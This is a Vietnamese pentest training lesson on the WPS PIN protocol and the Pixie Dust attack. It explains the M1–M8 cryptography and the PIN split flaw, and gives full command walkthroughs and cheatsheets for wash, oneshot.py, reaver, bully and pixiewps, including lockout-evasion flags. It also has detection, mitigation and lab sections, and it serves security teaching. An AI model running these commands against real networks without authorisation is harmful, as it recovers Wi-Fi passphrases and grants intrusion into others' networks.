---
title: "08. WPS PIN Protocol & Pixie Dust Attack"
type: hybrid
tags: [pentest, wifi, wireless, wps, pixiedust, pin, attack, lesson-08]
aliases: [WPS Pixie Dust]
created: 2026-04-01
---

> **Prerequisites**: [[01-frame-architecture|01. 802.11 Frame Architecture & State Machine]]
> **Objectives**:
> - Hiểu WPS PIN protocol M1–M8 message exchange ở mức cryptographic
> - Phân tích tại sao PIN 8 chữ số thực ra chỉ có 11,000 guesses (PIN split flaw)
> - Hiểu Pixie Dust attack — khai thác weak RNG trong E-S1/E-S2 nonce generation
> - Thực hành attack với oneshot.py, pixiewps, reaver

---

## Điều kiện khai thác

> [!note] Điều kiện — WPS PIN Brute-Force
> - AP bật WPS và **WPS Locked = No** (kiểm tra với `wash`)
> - WiFi adapter hỗ trợ monitor mode + injection
> - AP không có rate limiting đủ mạnh cho PIN attempts
> - Thời gian: vài giờ đến vài ngày (11,000 guesses × lock/retry delay)
>
> [!note] Điều kiện — Pixie Dust (nhanh hơn nhiều)
> - AP dùng chipset vulnerable: Ralink, MediaTek, Realtek cũ, Broadcom (một số)
> - WPS đang enabled
> - Chỉ cần **một lần exchange** M1–M7 để capture material
> - Thời gian: vài giây đến vài phút (offline computation)
>
---

## Cơ chế — WPS PIN Protocol

### Tổng quan WPS

WPS (Wi-Fi Protected Setup) là convenience feature để pair devices mà không cần nhập WPA2 passphrase. Có hai mode chính:
- **PIN mode**: User nhập 8-digit PIN (chúng ta tấn công mode này)
- **PBC mode**: User nhấn nút vật lý trên AP trong 2 phút

### WPS PIN — Split Verification Flaw

WPS PIN là 8 chữ số thập phân. Digit thứ 8 là **checksum** (Luhn-like, derive từ 7 digits đầu). Vậy chỉ có 7 digits thực sự.

Tệ hơn: WPS protocol verify PIN theo **2 halves riêng biệt**:
- **First half** (4 digits): verified trong Message 5
- **Second half** (3 digits, vì digit 8 là checksum): verified trong Message 7

```text
Tổng guesses:
First half:  10^4 = 10,000 guesses
Second half: 10^3 = 1,000 guesses
Total: 11,000 guesses (thay vì 10^8 = 100,000,000)
```text
Đây là sai lầm thiết kế cơ bản — WPS protocol tự tiết lộ kết quả verify từng half riêng biệt qua NACK.

### WPS M1–M8 Exchange

![[img-08-wps-protocol.svg]]
*Hình 1: WPS M1–M8 exchange và điểm tấn công Pixie Dust tại M5/M7*

**Message 1 (Enrollee → Registrar):**
```text
- E-Nonce: Enrollee nonce (128-bit random)
- E-MACAddr: Enrollee MAC
- E-PKe: Enrollee DH public key (1536-bit DH hoặc NIST P-192 EC)
```text
**Message 2 (Registrar → Enrollee):**
```text
- R-Nonce: Registrar (AP) nonce (128-bit random)
- R-MACAddr: Registrar MAC
- R-PKr: Registrar DH public key
```text
Sau M1+M2: Cả hai tính DH shared secret:
```text
DHKey = DH(E-PKe, r_B) = DH(R-PKr, r_A)
AuthKey = KDF(DHKey, "WPS Authentication Key", E-Nonce ‖ R-Nonce ‖ E-MAC ‖ R-MAC)[0:256]
KeyWrapKey = KDF(DHKey, "WPS Key Wrap Key", ...)[0:128]
EMSK = KDF(DHKey, "WPS Enhanced Master Session Key", ...)[0:256]
```text
**Message 3 (Registrar → Enrollee):**
```text
- R-Hash1 = HMAC-SHA256(AuthKey, E-S1 ‖ PSK1 ‖ E-PKe ‖ R-PKr)
- R-Hash2 = HMAC-SHA256(AuthKey, E-S2 ‖ PSK2 ‖ E-PKe ‖ R-PKr)
```text
Đây là commitment: AP cam kết biết E-S1, E-S2 (nhưng chưa reveal).

PSK1 = PIN[0:4] converted to 128-bit via `hmac-sha256(PIN first half as ASCII)`.
PSK2 = PIN[4:8] converted similarly.

**Message 4 (Enrollee → Registrar):**
```text
- E-Hash1 = HMAC-SHA256(AuthKey, E-S1 ‖ PSK1 ‖ E-PKe ‖ R-PKr)
- E-Hash2 = HMAC-SHA256(AuthKey, E-S2 ‖ PSK2 ‖ E-PKe ‖ R-PKr)
```text
**Message 5 (Registrar → Enrollee) — Pixie Dust target:**
```text
- E-S1 revealed (128-bit nonce)
```text
Enrollee verify: HMAC-SHA256(AuthKey, E-S1 ‖ PSK1 ‖ ...) == R-Hash1?
Nếu đúng → first half PIN correct. Nếu sai → NACK → retry.

**Message 6 (Enrollee → Registrar):**
```text
- R-S1 revealed để AP verify enrollee commitment
```text
**Message 7 (Registrar → Enrollee) — Pixie Dust target:**
```text
- E-S2 revealed (128-bit nonce)
```text
Verify second half PIN.

**Message 8 (Registrar → Enrollee) — thành công:**
```text
- Credential: SSID + WPA passphrase (encrypted bằng KeyWrapKey)
```text
### Pixie Dust Attack — Khai thác Weak RNG

**Phát hiện bởi**: Dominique Bongard (2014)

**Vulnerability**: Một số chipset tạo E-S1 và E-S2 bằng RNG yếu:
- Ralink: E-S1 = E-S2 = 0x00 * 16 (zero nonces!)
- Realtek: E-S1 = E-S2 = E-Nonce (reuse enrollee nonce)
- Broadcom: E-S1 và E-S2 derive từ timestamp (predictable)

**Attack flow:**
```text
1. Capture một WPS exchange (M1–M7) với AP vulnerable
2. Extract: E-Nonce, R-Nonce, E-PKe, R-PKr, E-Hash1, E-Hash2, R-Hash1, R-Hash2
3. Feed vào pixiewps:
   pixiewps -e <E-Nonce> -r <R-Nonce> -s <E-S1 candidate> -z <E-S2 candidate>
            -a <AuthKey> -n <E-Hash1> -m <E-Hash2>
4. pixiewps try E-S1 = zeros, E-S1 = E-Nonce, các pattern known
5. Với mỗi E-S1 candidate: verify R-Hash1 → nếu match → biết PSK1 → biết PIN first half
6. Tương tự cho E-S2 → PIN second half
7. Full PIN → M8 → WPA passphrase
```text
---

## Quy trình tấn công

**Môi trường giả định**: Kali Linux, Alfa AWUS036ACH, AP tại BSSID `AA:BB:CC:DD:EE:FF` channel 6.

### Bước 1 — Scan WPS-enabled APs

```bash
# Monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Scan WPS APs
sudo wash -i wlan0mon
```text
> **Expected output**:
> ```text
> BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
> AA:BB:CC:DD:EE:FF   6  -65  2.0  No   Ralink    TargetAP
> ```text
> Cột "Lck" = No → WPS chưa bị locked. Vendor = Ralink → Pixie Dust likely vulnerable!

### Bước 2 — Pixie Dust với oneshot.py (recommended)

```bash
# Clone oneshot nếu chưa có
git clone https://github.com/drygdryg/OneShot
cd OneShot

# Pixie Dust attack (-K flag)
sudo python3 oneshot.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -K
```text
> **Expected output** (nếu vulnerable):
> ```text
> [*] Running Pixie Dust Attack
> [*] Trying pin 12345670
> [+] WPS pin: 12345670
> [+] WPA PSK: MyWifiPassword
> [+] AP SSID: TargetAP
> ```text

### Bước 3 — Pixie Dust với reaver + pixiewps (manual)

```bash
# Reaver với Pixie Dust flag
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K 1

# Nếu reaver không tự làm, extract data manually:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -S \
    2>&1 | tee reaver_output.txt

# Extract E-Nonce, R-Nonce, hashes từ output
# Feed vào pixiewps trực tiếp:
pixiewps -e <enrollee_nonce> -r <registrar_nonce> \
         -s <e-s1> -z <e-s2> -a <authkey> \
         -n <e-hash1> -m <e-hash2> -v
```text
> **Expected output**: `WPS pin: XXXXXXXX` trong vài giây.

### Bước 4 — WPS PIN Brute-Force (nếu Pixie Dust fail)

```bash
# Reaver PIN brute-force
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Bully (alternative)
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -S -F -B -v 3

# Tốc độ: ~1 PIN/5 giây = 55,000 giây ≈ 15 giờ worst case
# Nhiều APs có exponential lockout → dùng -d (delay) và -r (retries)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -d 15 -r 3:15
```text
> **Expected output**: Sau nhiều attempts, `WPS PIN: XXXX XXXX` và `WPA PSK: password`.

### Bước 5 — Verify kết nối

```bash
# Dùng passphrase recovered
wpa_passphrase <SSID> "<recovered_passphrase>" > /tmp/wpa.conf
sudo wpa_supplicant -i wlan0 -c /tmp/wpa.conf -D nl80211
sudo dhclient wlan0
ip addr show wlan0
```text
---

## Biến thể & Bypass

### AP WPS Locked

```bash
# Nếu "Lck = Yes" trong wash
# Đợi lockout timeout (thường 60s hoặc sau reboot)
# Một số APs unlock sau khi power cycle

# Null PIN attack (một số implementations)
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -p ""

# WPS không disable được qua UI nhưng vẫn enable ở firmware level
# (silent WPS — check netrise 2025 research)
```text
### Chipset Detection cho Pixie Dust

```bash
# Từ wash output, Vendor field cho biết chipset candidate
# Ralink/MediaTek → high probability
# Realtek → medium probability
# Broadcom → lower probability, phụ thuộc firmware version

# Online resource: https://docs.google.com/spreadsheets/d/1tSlboqq_oEHSBSWqvf7f6hPc6TIFp6eE/edit
# List vulnerable APs theo model
```text
---

## Cây quyết định

```mermaid
flowchart TD
    A[AP bật WPS?] -->|Không| Z[WPS attack không apply]
    A -->|Có| B{WPS Locked?}
    B -->|Locked| C[Đợi unlock hoặc reboot AP]
    B -->|Không Locked| D{Vendor/Chipset?}
    C --> D
    D -->|Ralink/MediaTek| E[Thử Pixie Dust trước]
    D -->|Unknown| E
    D -->|Broadcom/Qualcomm| F[PIN brute-force]
    E --> G{Pixie Dust thành công?}
    G -->|Có - vài giây| H[Có passphrase]
    G -->|Không| F
    F --> I{PIN found?}
    I -->|Có - nhiều giờ| H
    I -->|AP locked liên tục| J[Document WPS, move on]
    H --> K[Connect → pentest network]
```text
---

## Command Cheatsheet

**Scan và enumerate**

```bash
# Monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Scan WPS APs
sudo wash -i wlan0mon

# Scan specific channel
sudo wash -i wlan0mon -c 6
```text
**Pixie Dust**

```bash
# oneshot.py (recommended)
sudo python3 oneshot.py -i wlan0mon -b <BSSID> -K

# reaver
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K 1

# bully
sudo bully wlan0mon -b <BSSID> -c <CH> -d -v 3
```text
**PIN Brute-Force**

```bash
# reaver basic
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv

# reaver với delay (anti-lockout)
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -d 15 -r 3:15

# bully
sudo bully wlan0mon -b <BSSID> -c <CH> -S -F -B -v 3

# null PIN
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -p ""
```text
---

## Daily Drill

**Thời gian**: 15–20 phút/ngày trong 5 ngày đầu.

**Drill 1 — WPS recon nhanh**
Mục tiêu: scan và đọc kết quả wash không cần lookup

```bash
sudo wash -i wlan0mon
# Đọc: WPS version, Lck status, Vendor → quyết định attack path
```text
Luyện cho đến khi: nhìn wash output biết ngay Pixie Dust hay brute-force.

**Drill 2 — Pixie Dust one-liner**
Mục tiêu: nhớ chính xác oneshot.py flags

```bash
sudo python3 oneshot.py -i wlan0mon -b <BSSID> -K
# -K = Pixie Dust
# -F = full scan (tìm WPS APs tự động)
# -p <PIN> = specify PIN manually
```text
Luyện cho đến khi: gõ command không cần help menu.

**Drill 3 — Đọc output**
Nhìn reaver/oneshot output, identify: vulnerable hay không?

```text
[+] WPS pin: → thành công
[!] WPS transaction failed → AP locked hoặc không vulnerable
[P] E-Nonce: → đang capture, Pixie Dust đang thử
```text
Luyện cho đến khi: không cần đọc docs để interpret output.

---

## Phát hiện & Phòng thủ

> [!warning] Detection
> **WPS Brute-Force**: Nhiều EAPOL-Start → M1 → NACK sequences trong thời gian ngắn từ cùng MAC.
> **Pixie Dust**: Chỉ cần một exchange duy nhất → khó detect hơn. Source MAC mới không có lease.
> **Syslog**: `/var/log/messages` trên AP: `wps: M5 processing failed` → attempt với sai PIN.
>
> [!note] Mitigation
> - **Disable WPS hoàn toàn** (tốt nhất). Nếu không thể: enable AP-side PIN lockout sau 3–5 failures.
> - **Firmware update**: Các vendor đã patch weak RNG sau 2014 disclosure. Nhưng legacy firmware vẫn còn.
> - WPA3-SAE networks không cần WPS — SAE có SAE-PK cho initial setup.
>
---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| HTB | **Wifinetic** (Retired) | WPS PIN brute-force thực tế với reaver |
| HTB | **WifineticTwo** (Retired) | Pixie Dust attack với oneshot.py — Ralink chipset |
| Local | hostapd với WPS config | Full control, practice cả hai attack types |

**Local hostapd WPS config:**

```bash
# /etc/hostapd/hostapd-wps.conf
# interface=wlan0
# ssid=WPSTestLab
# wpa=2
# wpa_passphrase=TestPass12345
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
# wps_state=2
# ap_pin=12345670
# config_methods=label push_button keypad
sudo hostapd /etc/hostapd/hostapd-wps.conf
```text
---

## Field Manual Entry

> [!abstract] WPS Pixie Dust — Quick Reference
> **Điều kiện**: AP bật WPS, WPS Locked=No, chipset Ralink/MediaTek (vulnerable)
> **Lệnh nhanh**: `sudo python3 oneshot.py -i wlan0mon -b <BSSID> -K`
> **Full flow**: `wash -i wlan0mon` → note Vendor → `oneshot.py -K` → passphrase trong seconds
> **Look for**: `[+] WPS pin:` và `[+] WPA PSK:` trong output
> **Fallback**: `reaver -i wlan0mon -b <BSSID> -c <CH> -vv` cho PIN brute-force (~15h)
> **Ref**: [[08-wps-pixiedust|08. WPS & Pixie Dust]]
>